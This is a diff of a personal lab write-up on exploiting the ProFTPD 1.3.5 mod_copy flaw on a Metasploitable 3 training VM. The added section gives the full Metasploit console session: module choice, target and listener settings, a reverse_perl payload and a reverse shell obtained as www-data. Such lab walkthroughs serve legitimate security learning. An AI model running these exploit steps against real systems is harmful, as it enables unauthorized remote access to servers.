@@ -2,7 +2,7 @@
 
 This document will demonstrate abusing a vulnerability in the ProFTPD 1.3.5 service on the Metasploitable 3 computer.
 
-**This demonstration is stuck as of May 7th, 2022**
+**Demonstration last edited on the 8th of May 2022**
 
 IP addresses in my network:    
 172.28.128.3  
@@ -145,7 +145,7 @@ References:
   https://www.exploit-db.com/exploits/36742
 ``` 
 
-So in short the exploit should give me the access to remotely copy any files from the system to where ever I wish. Sounds neat. All I need is to set the RHOSTS to my intended target, set my payload (the code that will be run on target) and run exploit.  
+So in short the exploit should give me the access to remotely copy files from the system to where ever I wish. Sounds neat. All I need is to set the RHOSTS to my intended target, set my payload (the code that will be run on target) and run exploit.  
 
 ```
 msf6 > set RHOSTS 172.28.128.3
@@ -247,6 +247,96 @@ The connection worked in a way because the .php files appeared in the Metasploit
 
 <img src="../Screenshots/l5port21exploitFiles.png">
 
-One thing I do notice is that all the files were created without execute rights so this might be the issue.  
-
 I will give up for now and continue on this later.  
+
+**8th of May 2022:**  
+
+Time to conitinue. The problem was using bind-shells. After using the perl reverse shell with LHOST set to my own IP the connection worked like a charm. See commands and settings from the following:  
+```
+msf6 > search ProFTPD 1.3.5   # The targeted service at port 21 as seen from the nmap scan
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec
+
+msf6 > use 0
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 172.28.128.3     # Set the target
+RHOSTS => 172.28.128.3
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html  # Set the path to a writable directory
+SITEPATH => /var/www/html
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 172.28.128.5      # Set the localhost to point to my own IP
+LHOST => 172.28.128.5
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show payloads         
+
+Compatible Payloads
+===================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  payload/cmd/unix/bind_awk                             normal  No     Unix Command Shell, Bind TCP (via AWK)
+   1  payload/cmd/unix/bind_perl                            normal  No     Unix Command Shell, Bind TCP (via Perl)
+   2  payload/cmd/unix/bind_perl_ipv6                       normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   3  payload/cmd/unix/generic                              normal  No     Unix Command, Generic Command Execution
+   4  payload/cmd/unix/reverse_awk                          normal  No     Unix Command Shell, Reverse TCP (via AWK)
+   5  payload/cmd/unix/reverse_perl                         normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   6  payload/cmd/unix/reverse_perl_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   7  payload/cmd/unix/reverse_python                       normal  No     Unix Command Shell, Reverse TCP (via Python)
+   8  payload/cmd/unix/reverse_python_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set PAYLOAD 5               # Use reverse_perl cmd payload
+PAYLOAD => cmd/unix/reverse_perl
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options        
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     172.28.128.3     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www/html    yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.28.128.5     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run
+
+[*] Started reverse TCP handler on 172.28.128.5:4444 
+[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server
+[*] 172.28.128.3:80 - 172.28.128.3:21 - Sending copy commands to FTP server
+[*] 172.28.128.3:80 - Executing PHP payload /LVocqO9.php
+[*] Command shell session 1 opened (172.28.128.5:4444 -> 172.28.128.3:48575 ) at 2022-05-09 06:15:50 -0400
+
+whoami
+www-data
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+echo 'pwned' | tee pwned.txt            
+pwned
+cat pwned.txt   
+pwned
+```
